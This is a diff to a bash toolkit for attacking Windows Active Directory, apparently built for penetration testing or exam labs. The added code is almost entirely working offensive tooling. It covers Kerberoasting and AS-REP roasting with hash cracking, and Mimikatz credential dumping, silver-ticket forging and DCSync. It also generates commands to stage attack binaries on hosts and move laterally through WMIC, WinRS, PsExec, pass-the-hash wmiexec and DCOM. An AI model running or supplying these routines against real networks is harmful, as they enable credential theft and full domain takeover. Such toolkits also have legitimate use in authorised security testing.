@@ -1,5 +1,7 @@
 #!/bin/bash
 SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
+source "$SCRIPTDIR/password_cracking.sh"
+
 get_powerview() {
     if [[ -f "powerview.ps1" ]]; then
         echo "Powerview script already exists, skipping download."
@@ -11,11 +13,9 @@ get_powerview() {
 }
 
 get_ldap_search() {
-    if [[ -f "ldap_search.ps1" ]]; then
-        echo "LDAPSearch script already exists, skipping download."
-        return 0
+    if [[ ! -f "ldap_search.ps1" ]]; then
+        cp "$SCRIPTDIR/../ps1/ldap_search.ps1" ldap_search.ps1   
     fi
-    cp $SCRIPTDIR/../ps1/ldap_search.ps1 ldap_search.ps1   
     generate_iwr ldap_search.ps1
     echo '. .\ldap_search.ps1;'
 }
@@ -176,13 +176,12 @@ bloodhound_upload_file () {
     if [[ ! -z "$upload_return" ]]; then
         bloodhound_error "$upload_return"
         if [[ $? -ne 0 ]]; then
-            echo "Failed to upload files" | tee -a $trail_log
+            echo "Failed to upload files" 
             return 1
         fi
         echo "File uploaded successfully: $upload_return"
     else
-        echo "File upload failed." >> $trail_log
-        return 1
+        echo "No response, assuming upload was successful." 
     fi
 
 }
@@ -199,19 +198,353 @@ bloodhound_end_upload() {
     if [[ ! -z "$end_upload_return" ]]; then
         bloodhound_error "$end_upload_return"
         if [[ $? -ne 0 ]]; then
-            echo "Failed to end BloodHound upload." | tee -a $trail_log
+            echo "Failed to end BloodHound upload." 
             return 1
         fi
         echo "BloodHound upload ended successfully."
     else
-        echo "Failed to end BloodHound upload." >> $trail_log
-        return 1
+        echo "No response, assuming end upload ended successfully."       
     fi
 }
 
 upload_bloodhound_data() {
+    local file_path="$1"
+    if [[ -z "$file_path" ]]; then
+        echo "File path is required for BloodHound upload."
+        return 1
+    fi
+    if [[ ! -f "$file_path" ]]; then
+        echo "File $file_path does not exist."
+        return 1
+    fi
+    if [[ -f "$file_path.done" ]]; then
+        echo "BloodHound upload for $file_path is already done."
+        return 0
+    fi
     bloodhound_login
     bloodhound_start_upload
     bloodhound_upload_file "$1"
     bloodhound_end_upload
+    if [[ $? -eq 0 ]]; then
+        echo "BloodHound data uploaded successfully."
+        touch "$file_path.done"
+    else
+        echo "Failed to upload BloodHound data."
+        return 1
+    fi
+}
+
+get_spray_passwords() {
+    if [[ ! -f "Spray-Passwords.ps1" ]]; then
+        cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
+    fi
+    generate_iwr Spray-Passwords.ps1
+
+}
+
+get_kerbrute() {
+    local kerbrute_url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
+    if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
+        wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
+    fi
+    generate_iwr kerbrute_windows_amd64.exe
+}
+
+get_crackmapexec_windows() {
+    local crackmapexec_url="https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-windows-latest-3.10.1.zip"
+    if [[ ! -f "cme-windows-latest-3.10.1.zip" ]]; then
+        wget "$crackmapexec_url" -O cme-windows-latest-3.10.1.zip >> $trail_log
+    fi
+    if [[ ! -f "cme.exe" ]]; then
+        unzip cme-windows-latest-3.10.1.zip >> $trail_log
+        mv cme cme.exe
+    fi
+    generate_iwr cme.exe
+}
+
+get_computers() {
+    echo '. .\PowerView.ps1;'
+    echo 'Get-DomainComputer | select -ExpandProperty name > computers.txt;'
+    upload_file 'computers.txt'
+}
+
+get_rubeus() {
+    if [[ ! -f "Rubeus.exe" ]]; then
+        cp /usr/share/windows-resources/rubeus/Rubeus.exe .
+    fi
+    generate_iwr Rubeus.exe
+}
+
+perform_kerberoast_rubeus() {
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.kerberoast"
+    fi
+    get_rubeus
+    echo '.\Rubeus.exe kerberoast /outfile:'$hash_file';'
+    upload_file $hash_file
+}
+
+perform_asrep_roasting() {
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.asreproast"
+    fi
+    perform_impacket "impacket-GetNPUsers" "-request"
+}
+
+perform_impacket_kerberoast() {
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.kerberoast"
+    fi
+    perform_impacket "impacket-GetUserSPNs" "-request"
+}
+
+perform_impacket() {
+    local impacket_command="$1"
+    if [[ -z "$impacket_command" ]]; then
+        echo "Impacket command must be specified."
+        return 1
+    fi
+    local impacket_command_options=""
+    if [[ ! -z "$2" ]]; then
+        impacket_command_options="$2"
+    fi
+    local proxychain_command=""
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes"
+    fi
+    if [[ -z "$username" ]] ; then
+        echo "Username must be set before running Kerberoast."
+        return 1
+    fi
+    if [[ -z "$domain" ]] ; then
+        echo "No domain was set. Make sure you are sure about this"
+    fi
+    if [[ -z "$target_ip" ]]; then
+        echo "target_ip is not set" 
+    fi
+    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
+        proxychain_command="proxychains -q "
+        echo "Running $impacket_command with proxychains"
+    else
+        proxychain_command=""
+    fi
+    local impacket_dc_host=""
+    if [[ ! -z "$dc_host" ]]; then
+        impacket_dc_host="-dc-host $dc_host"
+    fi
+    local impacket_dc_ip=""
+    if [[ ! -z "$dc_ip" ]]; then
+        impacket_dc_ip="-dc-ip $dc_ip"
+    fi
+    if [[ -z "$impacket_dc_host" ]] && [[ -z "$impacket_dc_ip" ]]; then
+        echo "Either impacket_dc_host or impacket_dc_ip must be set for Kerberoast."
+        return 1
+    fi
+    if [[ -f "$hash_file" ]]; then
+        echo "$hash_file already exists, skipping impacket"
+        return 0
+    fi
+    local target=$username:$password
+    if [[ ! -z "$domain" ]]; then
+        target="$domain/$target"
+    fi
+    if [[ ! -z "$target_ip" ]]; then
+        target="$target@$target_ip"        
+    fi
+    echo "target=$target"
+    ${proxychain_command}$impacket_command $impacket_command_options $impacket_dc_host $impacket_dc_ip -outputfile $hash_file -no-pass -k $target
+
+}
+
+
+hashcat_kerberoast() {    
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.kerberoast"
+    fi
+    hash_mode=13100  # Kerberoast hash mode
+    hashcat_generic 
+}
+
+hashcat_asrep_kerberoast() {
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.asreproast"
+    fi
+    hash_mode=18200  # AS-REP Kerberos hash mode
+    hashcat_generic
+}
+
+get_silverticket_command() {
+    if [[ -z "$username" ]] || [[ -z "$domain" ]] || [[ -z "$target_hostname" ]]; then
+        echo "Username, domain, and target IP/host address must be set before running SilverTicket command."
+        return 1
+    fi
+    if [[ -z "$target_service" ]]; then
+        target_service="http"
+    fi
+    echo '$sid = whoami /user | findstr '$username' | ForEach-Object {$parts = $_.Split('"' '"'); $parts[1]} | ForEach-Object {$last_index=$_.LastIndexOf('"'-'"'); $_.Substring(0,$last_index)}'
+    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_log.txt;'
+    echo '$mimikatz_log = Get-Content mimikatz_log.txt -Raw;'
+    echo '$matches = $mimikatz_log | Select-String -Pattern "(?s)iis_service.*?SHA1"'
+    echo '$ntlm_hash = $matches.Matches.Value | findstr NTLM | ForEach-Object {$last_index=$_.LastIndexOf('"':'"'); $_.SubString($last_index+2)}'
+    echo '$username = "'$username'"'
+    echo '$domain = "'$domain'"'
+    echo '$target = "'$target_hostname'"'
+    echo '$target_service = "'$target_service'"'
+    echo '.\mimikatz.exe "kerberos::golden /sid:$sid /domain:$domain /ptt /target:$target /service:$target_service /rc4:$ntlm_hash /user:$username" exit'
+
+}
+
+get_dcsync_command() {
+    if [[ -z "$target_username" ]]; then
+        echo "Target username is required for DCSync command."
+        return 1
+    fi
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.dcsync"
+    fi
+    if [[ -z "$mimikatz_log" ]]; then
+        mimikatz_log="mimikatz_dcsync.log"
+    fi
+    get_mimikatz
+    echo '.\mimikatz.exe "lsadump::dcsync /user:'$target_username'" exit > '$mimikatz_log';'
+    upload_file "$mimikatz_log"
+    if [[ -f $mimikatz_log ]]; then
+        echo "DCSync command executed successfully, log saved to $mimikatz_log."
+        sudo dos2unix $mimikatz_log
+        ntlm_hash=$(grep -oP 'Hash NTLM: \K.*' $mimikatz_log | head -n 1)
+        echo "NTLM hash extracted: $ntlm_hash"
+        if [[ ! -z "$ntlm_hash" ]]; then
+            echo $ntlm_hash > $hash_file
+            hashcat -m 1000 $hash_file /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+        fi
+    fi
+}
+
+perform_impacket_secretsdump () {
+
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes.secretsdump"
+    fi
+    if [[ -z "$target_username" ]]; then
+        echo "Target username must be set before running secretsdump."
+        return 1
+    fi
+    perform_impacket "impacket-secretsdump" "-just-dc-user $target_username"
+
+}
+
+perform_wmic_command() {
+    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, password, and target IP address must be set before running WMIC command."
+        return 1
+    fi
+    if [[ -z "$cmd" ]]; then
+        echo "WMIC cmd is required."
+        return 1
+    fi
+    local wmic_command="wmic /node:$target_ip /user:$username /password:$password process call create \"$cmd\""
+    echo "$wmic_command"
+}
+
+perform_wmic_powershell_command() {
+    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, password, and target IP address must be set before running WMIC command."
+        return 1
+    fi
+    if [[ -z "$cmd" ]]; then
+        echo "WMIC cmd is required."
+        return 1
+    fi
+    local powershell_commands='$username = '"'$username';"
+    powershell_commands+='$password = '"'$password';"
+    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
+    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
+    powershell_commands+='$options = New-CimSessionOption -Protocol DCOM;'
+    powershell_commands+='$session = New-Cimsession -ComputerName '$target_ip' -Credential $credential -SessionOption $Options;'
+    powershell_commands+='$command = '"'$cmd';"
+    powershell_commands+='Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};'
+    echo "$powershell_commands"
+
+}
+
+perform_winrs_command() {
+    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, password, and target IP address must be set before running WinRM command."
+        return 1
+    fi
+    if [[ -z "$cmd" ]]; then
+        echo "WinRM cmd is required."
+        return 1
+    fi
+    local winrs_command="winrs -r:$target_ip -u:$username -p:$password \"$cmd\""
+    echo "$winrs_command"
+}
+
+perform_powershell_remoting_command() {
+    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, password, and target IP address must be set before running WinRM command."
+        return 1
+    fi
+    local powershell_commands='$username = '"'$username';"
+    powershell_commands+='$password = '"'$password';"
+    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
+    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
+    powershell_commands+='New-PSSession -ComputerName '$target_ip' -Credential $credential;'
+    powershell_commands+='Enter-PSSession 1'
+    echo "$powershell_commands"
+}
+
+get_psexec() {
+    local pstools_link="https://download.sysinternals.com/files/PSTools.zip"
+    if [[ ! -f  "PSTools.zip" ]]; then
+        wget "$pstools_link" -O PSTools.zip >> $trail_log
+    fi
+    if [[ -z "$PsExec_exe" ]]; then
+        PsExec_exe="PsExec.exe"
+    fi
+    if [[ ! -d "pstools" ]]; then
+        unzip -u PSTools.zip -d pstools >> $trail_log
+    fi
+    generate_iwr "pstools/$PsExec_exe" "$PsExec_exe"
+}
+
+run_psexec() { 
+    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_hostname" ]]; then
+        echo "Username, password, and target hostname address must be set before running PsExec command."
+        return 1
+    fi
+    echo '--- PSExec criteria ---'
+    echo 'credentials must be part of local administrators group'
+    echo 'ADMIN$ share must be enabled'
+    echo 'File and Printer Sharing must be enabled'
+    local psexec_username="$username"
+    if [[ ! -z "$domain" ]]; then
+        psexec_username="$domain\\$username"
+    fi
+    get_psexec
+    local psexec_command=".\\$PsExec_exe -u $psexec_username -p $password -i \\\\$target_hostname cmd"
+    echo "$psexec_command"
+
+}
+
+perform_impacket_wmiexec() {
+    if [[ -z "$username" ]] || [[ -z "$ntlm_hash" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
+        return 1
+    fi
+    impacket-wmiexec -hashes $ntlm_hash $username@$target_ip
+}
+
+perform_dcom() {
+    if [[ -z "$target_ip" ]]; then
+        echo "Target IP address must be set before running DCOM command."
+        return 1
+    fi
+    if [[ -z "$cmd" ]]; then
+        echo "DCOM cmd is required."
+        return 1
+    fi
+    local powershell_command='$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","'$target_ip'"));'
+    powershell_command+='$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c '$cmd'", "7")'
+    echo "$powershell_command"   
 }
